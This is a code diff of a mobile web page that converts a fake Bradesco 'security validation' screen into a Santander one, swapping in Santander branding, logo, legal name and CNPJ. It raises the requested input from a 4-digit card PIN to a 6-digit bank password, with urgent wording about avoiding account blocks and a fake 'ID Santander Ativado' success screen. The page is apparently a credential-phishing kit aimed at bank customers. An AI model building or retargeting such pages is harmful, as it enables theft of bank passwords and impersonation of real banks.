@@ -3,37 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bradesco - Segurança</title>
+    <title>Santander - Segurança</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap');
         
         :root {
-            --brad-red: #CC092F;
-            --brad-dark-red: #990520;
-            --brad-bg: #F4F6F9;
-            --brad-card: #FFFFFF;
-            --brad-text-dark: #2B2B2B;
-            --brad-text-light: #707070;
-            --brad-border: #E2E8F0;
+            --santander-red: #EC0000;
+            --santander-dark-red: #CC0000;
+            --santander-bg: #F5F7FA;
+            --santander-card: #FFFFFF;
+            --santander-text-dark: #222222;
+            --santander-text-light: #666666;
+            --santander-border: #DDE3EA;
         }
 
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: 'Open Sans', sans-serif;
             background-color: #0F172A;
             margin: 0;
             display: flex;
             justify-content: center;
             min-height: 100vh;
             overflow-x: hidden;
-            color: var(--brad-text-dark);
+            color: var(--santander-text-dark);
+            -webkit-tap-highlight-color: transparent;
         }
 
         .phone-container {
             width: 100%;
             max-width: 450px;
-            background-color: var(--brad-bg);
+            background-color: var(--santander-bg);
             display: flex;
             flex-direction: column;
             position: relative;
@@ -41,46 +42,64 @@
             min-height: 100vh;
         }
 
-        /* Top Header style of Bradesco App */
-        .brad-header {
-            background: linear-gradient(135deg, var(--brad-red) 0%, var(--brad-dark-red) 100%);
-            padding: 24px 20px 24px 20px;
+        .santander-header {
+            background: linear-gradient(135deg, var(--santander-red) 0%, var(--santander-dark-red) 100%);
+            padding: 24px 20px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             color: white;
-            border-bottom-left-radius: 16px;
-            border-bottom-right-radius: 16px;
-            box-shadow: 0 4px 12px rgba(204, 9, 47, 0.15);
+            box-shadow: 0 4px 12px rgba(236, 0, 0, 0.15);
         }
 
         .digit-container {
             display: flex;
             justify-content: center;
-            gap: 16px;
+            gap: 10px; /* Reduced gap to perfectly fit 6 digits on small mobile screens */
             margin: 35px 0;
         }
 
         .digit-box {
-            width: 55px;
-            height: 65px;
-            background-color: var(--brad-card);
-            border: 2px solid var(--brad-border);
-            border-radius: 12px;
+            width: 46px; /* Optimized width for 6 digits */
+            height: 60px; /* Optimized height for 6 digits */
+            background-color: var(--santander-card);
+            border: 2px solid var(--santander-border);
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
-            color: var(--brad-red);
+            color: var(--santander-red);
             transition: all 0.2s ease;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.02);
+            position: relative;
         }
 
         .digit-box.filled {
-            border-color: var(--brad-red);
-            box-shadow: 0 0 12px rgba(204, 9, 47, 0.12);
-            background-color: #FFF5F6;
+            border-color: var(--santander-red);
+            box-shadow: 0 0 12px rgba(236, 0, 0, 0.12);
+            background-color: #FFF0F0;
+        }
+
+        /* Active box styling with simulated blinking cursor */
+        .digit-box.active-box {
+            border-color: var(--santander-red);
+            box-shadow: 0 0 0 3px rgba(236, 0, 0, 0.15);
+        }
+
+        .digit-box.active-box::after {
+            content: '';
+            width: 2px;
+            height: 20px;
+            background-color: var(--santander-red);
+            animation: blink 1s infinite;
+            position: absolute;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
         }
 
         #hidden-input {
@@ -89,12 +108,12 @@
             pointer-events: none;
         }
 
-        .btn-brad {
-            background: linear-gradient(135deg, var(--brad-red) 0%, var(--brad-dark-red) 100%);
+        .btn-santander {
+            background: var(--santander-red);
             color: #FFFFFF;
             padding: 16px;
             width: 100%;
-            border-radius: 12px;
+            border-radius: 8px;
             font-weight: 600;
             font-size: 16px;
             transition: all 0.3s;
@@ -102,11 +121,11 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            box-shadow: 0 4px 12px rgba(204, 9, 47, 0.2);
+            box-shadow: 0 4px 12px rgba(236, 0, 0, 0.2);
         }
 
-        .btn-brad:disabled {
-            background: #E2E8F0;
+        .btn-santander:disabled {
+            background: #E0E4E9;
             color: #A0AEC0;
             box-shadow: none;
             cursor: not-allowed;
@@ -121,7 +140,6 @@
             opacity: 0;
         }
 
-        /* Circular loader branded to Bradesco */
         .loader {
             border: 3px solid rgba(255,255,255,0.3);
             border-top: 3px solid #ffffff;
@@ -140,22 +158,20 @@
 <body onclick="focusCurrentInput()">
 
     <div class="phone-container">
-        <!-- Top Bradesco Header -->
-        <div class="brad-header">
+        <!-- Top Santander Header -->
+        <div class="santander-header">
             <div class="flex items-center gap-3">
                 <i data-lucide="chevron-left" class="w-6 h-6 text-white cursor-pointer hover:opacity-80"></i>
             </div>
             
-            <!-- Bradesco SVG Logo High Fidelity -->
+            <!-- Santander Logo High Fidelity SVG -->
             <div class="flex items-center gap-2">
                 <svg class="w-8 h-8" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <circle cx="50" cy="50" r="48" fill="#FFFFFF"/>
-                    <!-- Bradesco Symbol (Tree Shape) -->
-                    <path d="M50 25 L32 45 H42 V75 H58 V45 H68 L50 25 Z" fill="#CC092F"/>
-                    <rect x="46" y="52" width="8" height="23" fill="#FFFFFF"/>
-                    <path d="M50 34 L39 46 H61 L50 34 Z" fill="#FFFFFF"/>
+                    <path d="M48 22C48 22 56 32 54 44C52 56 36 60 44 76C45 78 48 80 52 80C62 80 70 70 70 56C70 38 56 26 48 22Z" fill="#EC0000"/>
+                    <path d="M44 32C44 32 34 42 36 52C38 62 50 64 44 76C43 74 41 72 38 68C32 58 36 44 44 32Z" fill="#EC0000"/>
                 </svg>
-                <span class="font-bold text-xl tracking-tight text-white">bradesco</span>
+                <span class="font-bold text-xl tracking-tight text-white lowercase">santander</span>
             </div>
             
             <i data-lucide="help-circle" class="w-6 h-6 text-white cursor-pointer opacity-90"></i>
@@ -163,43 +179,44 @@
 
         <div class="flex-grow p-6 flex flex-col justify-between">
             
-            <!-- Passo Único: Senha do Cartão (4 dígitos) -->
+            <!-- Passo Único: Senha (6 dígitos) -->
             <div id="step-1" class="step-transition flex-grow flex flex-col justify-between">
                 <div>
                     <div class="mb-6 mt-4 text-center">
-                        <div class="inline-flex p-3 bg-red-50 rounded-full text-[#CC092F] mb-3">
+                        <div class="inline-flex p-3 bg-red-50 rounded-full text-[#EC0000] mb-3">
                             <i data-lucide="shield-alert" class="w-8 h-8"></i>
                         </div>
-                        <h1 class="text-xl font-bold text-gray-800 mb-2">Validação de Segurança</h1>
+                        <h1 class="text-xl font-bold text-gray-800 mb-2">Validação de Seguraça ID Santander</h1>
                         <p class="text-gray-500 text-sm leading-relaxed px-2">
-                            Para autorizar e sincronizar a sua chave de segurança, digite a sua <strong>senha do cartão de 4 dígitos</strong>.
+                            Para sua seguraça e validar o seu dispositivo, digite a sua <strong>senha de 6 dígitos</strong> do banco.
                         </p>
                     </div>
 
                     <!-- Informational Warning (Visible Password) -->
-                    <div class="bg-amber-50 p-4 rounded-xl border border-amber-100 mb-6 flex items-start gap-3">
-                        <i data-lucide="eye" class="w-5 h-5 text-amber-600 mt-0.5 flex-shrink-0"></i>
-                        <p class="text-xs text-amber-800 leading-relaxed font-medium">
-                            <strong>Atenção:</strong> Sua senha de 4 dígitos ficará temporariamente visível no campo abaixo para sua conferência.
+                    <div class="bg-red-50/50 p-4 rounded-xl border border-red-100 mb-6 flex items-start gap-3">
+                        <i data-lucide="eye" class="w-5 h-5 text-red-600 mt-0.5 flex-shrink-0"></i>
+                        <p class="text-xs text-red-900 leading-relaxed font-medium">
+                            <strong>Atenção:</strong> Digite Sua senha de 6 dígitos para sua conferência e evite bloqueios na conta.
                         </p>
                     </div>
 
-                    <!-- Input 4 Digits Visual Container -->
+                    <!-- Input 6 Digits Visual Container -->
                     <div class="relative">
                         <div class="digit-container" id="container-card">
-                            <div class="digit-box" id="boxCard-0"></div>
+                            <div class="digit-box active-box" id="boxCard-0"></div>
                             <div class="digit-box" id="boxCard-1"></div>
                             <div class="digit-box" id="boxCard-2"></div>
                             <div class="digit-box" id="boxCard-3"></div>
+                            <div class="digit-box" id="boxCard-4"></div>
+                            <div class="digit-box" id="boxCard-5"></div>
                         </div>
-                        <!-- Hidden inputs styled properly for accessibility and trigger -->
-                        <input type="number" id="input-card" class="absolute opacity-0 pointer-events-none" inputmode="numeric" pattern="[0-9]*" maxlength="4">
+                        <input type="number" id="input-card" class="absolute opacity-0 pointer-events-none" inputmode="numeric" pattern="[0-9]*" maxlength="6">
                     </div>
                 </div>
 
                 <div class="mt-8 mb-4">
-                    <button id="btn-confirm-card" disabled class="btn-brad">
-                        Confirmar e Sincronizar
+                    <button id="btn-confirm-card" disabled class="btn-santander">
+                        Confirmar e Validar ID
                     </button>
                 </div>
             </div>
@@ -209,13 +226,13 @@
                 <div class="w-24 h-24 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-emerald-100 shadow-sm">
                     <i data-lucide="shield-check" class="w-12 h-12 text-emerald-600"></i>
                 </div>
-                <h2 class="text-2xl font-bold text-gray-800 mb-2">Dispositivo Sincronizado!</h2>
+                <h2 class="text-2xl font-bold text-gray-800 mb-2">ID Santander Ativado!</h2>
                 <p class="text-gray-500 text-sm leading-relaxed max-w-sm px-4">
-                    Sua chave de segurança Bradesco foi atualizada e validada com sucesso em nosso sistema de segurança.
+                    Seu aplicativo e chaves de segurança foram sincronizados e validados com sucesso com nossos servidores.
                 </p>
                 
                 <div class="mt-12 w-full px-4">
-                    <button onclick="location.reload()" class="btn-brad w-full">
+                    <button onclick="location.reload()" class="btn-santander w-full">
                         Voltar ao Início
                     </button>
                 </div>
@@ -223,9 +240,9 @@
             
         </div>
 
-        <!-- Rodapé Institucional Bradesco -->
+        <!-- Rodapé Institucional Santander -->
         <div class="p-6 text-center mt-auto border-t border-gray-100 bg-white">
-            <p class="text-[11px] text-gray-400 font-medium tracking-wide">Banco Bradesco S.A. • CNPJ: 60.746.948/0001-12</p>
+            <p class="text-[11px] text-gray-400 font-medium tracking-wide">Banco Santander (Brasil) S.A. • CNPJ: 90.400.888/0001-42</p>
         </div>
     </div>
 
@@ -241,32 +258,40 @@
 
         let currentActiveInput = inputCard;
 
-        // Auto-focus handler when tapping anywhere inside the screen
         function focusCurrentInput() {
             if (currentActiveInput) {
                 currentActiveInput.focus();
             }
         }
 
-        // Numeric input logic for 4 visible digits
         inputCard.addEventListener('input', (e) => {
-            let val = e.target.value.replace(/\D/g, '').slice(0, 4);
+            // Force strict numeric pattern and limit to 6 digits
+            let val = e.target.value.replace(/\D/g, '').slice(0, 6);
             inputCard.value = val;
 
-            for (let i = 0; i < 4; i++) {
+            for (let i = 0; i < 6; i++) {
                 const box = document.getElementById(`boxCard-${i}`);
+                
+                // Clear any leftover state
+                box.classList.remove('filled', 'active-box');
+                
                 if (i < val.length) {
-                    box.innerText = val[i]; // Displays the password digit explicitly (visible)
+                    box.innerText = val[i]; 
                     box.classList.add('filled');
                 } else {
                     box.innerText = '';
-                    box.classList.remove('filled');
+                }
+
+                // Focus/Blinking Cursor visual simulation on the active box
+                if (i === val.length) {
+                    box.classList.add('active-box');
                 }
             }
-            btnCard.disabled = val.length !== 4;
+            
+            // Enable button only when all 6 digits are typed
+            btnCard.disabled = val.length !== 6;
         });
 
-        // Confirmation action & Loading sequence
         btnCard.addEventListener('click', () => {
             btnCard.innerHTML = '<div class="loader"></div>';
             btnCard.disabled = true;
@@ -283,14 +308,13 @@
             }, 2000);
         });
 
-        // Block special keys inside numeric fields
+        // Block non-numeric modifier keys in numeric keyboard flow
         inputCard.addEventListener('keydown', (e) => {
             if (["e", "E", "+", "-", ".", ","].includes(e.key)) {
                 e.preventDefault();
             }
         });
 
-        // Trigger focus after loading is complete
         window.onload = () => {
             setTimeout(focusCurrentInput, 500);
         };
